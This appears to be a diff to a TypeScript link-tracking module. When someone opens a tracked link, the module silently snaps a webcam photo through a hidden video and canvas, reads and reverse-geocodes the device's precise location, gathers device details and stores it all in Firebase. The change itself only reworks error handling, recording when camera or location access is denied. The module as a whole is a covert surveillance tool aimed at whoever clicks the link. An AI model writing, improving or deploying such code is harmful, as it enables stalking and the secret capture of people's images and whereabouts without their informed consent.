@@ -18,15 +18,19 @@ interface TrackingData {
     screenResolution: string;
   };
   photo?: string;
+  errors?: {
+    location?: string;
+    photo?: string;
+  };
 }
 
-export const capturePhoto = async (): Promise<string> => {
+export const capturePhoto = async (): Promise<{ photo?: string; error?: string }> => {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     const video = document.createElement('video');
     video.srcObject = stream;
     
-    return new Promise((resolve, reject) => {
+    return new Promise((resolve) => {
       video.onloadedmetadata = () => {
         video.play();
         const canvas = document.createElement('canvas');
@@ -38,15 +42,15 @@ export const capturePhoto = async (): Promise<string> => {
           ctx.drawImage(video, 0, 0);
           const photo = canvas.toDataURL('image/jpeg');
           stream.getTracks().forEach(track => track.stop());
-          resolve(photo);
+          resolve({ photo });
         } else {
-          reject(new Error('Could not get canvas context'));
+          resolve({ error: 'Could not get canvas context' });
         }
       };
     });
   } catch (error) {
     console.error('Error capturing photo:', error);
-    return '';
+    return { error: 'Camera access denied' };
   }
 };
 
@@ -72,7 +76,7 @@ export const getDeviceInfo = (): TrackingData['device'] => {
   }
 };
 
-export const getLocation = async (): Promise<TrackingData['location']> => {
+export const getLocation = async (): Promise<{ location?: TrackingData['location']; error?: string }> => {
   try {
     const position = await new Promise<GeolocationPosition>((resolve, reject) => {
       navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -89,15 +93,17 @@ export const getLocation = async (): Promise<TrackingData['location']> => {
     const data = await response.json();
     
     return {
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      country: data.address?.country,
-      countryCode: data.address?.country_code?.toUpperCase(),
-      city: data.address?.city || data.address?.town
+      location: {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        country: data.address?.country,
+        countryCode: data.address?.country_code?.toUpperCase(),
+        city: data.address?.city || data.address?.town
+      }
     };
   } catch (error) {
     console.error('Error getting location:', error);
-    return undefined;
+    return { error: 'Location access denied' };
   }
 };
 
@@ -105,27 +111,24 @@ export const trackAccess = async (linkId: string) => {
   try {
     const trackingData: TrackingData = {
       timestamp: Date.now(),
-      device: getDeviceInfo()
+      device: getDeviceInfo(),
+      errors: {}
     };
     
     // Get location
-    try {
-      const location = await getLocation();
-      if (location) {
-        trackingData.location = location;
-      }
-    } catch (error) {
-      console.error('Error getting location:', error);
+    const locationResult = await getLocation();
+    if (locationResult.location) {
+      trackingData.location = locationResult.location;
+    } else if (locationResult.error) {
+      trackingData.errors.location = locationResult.error;
     }
     
     // Capture photo
-    try {
-      const photo = await capturePhoto();
-      if (photo) {
-        trackingData.photo = photo;
-      }
-    } catch (error) {
-      console.error('Error capturing photo:', error);
+    const photoResult = await capturePhoto();
+    if (photoResult.photo) {
+      trackingData.photo = photoResult.photo;
+    } else if (photoResult.error) {
+      trackingData.errors.photo = photoResult.error;
     }
     
     // Save to Firebase
@@ -137,4 +140,4 @@ export const trackAccess = async (linkId: string) => {
     console.error('Error tracking access:', error);
     throw error;
   }
-}; 
+};
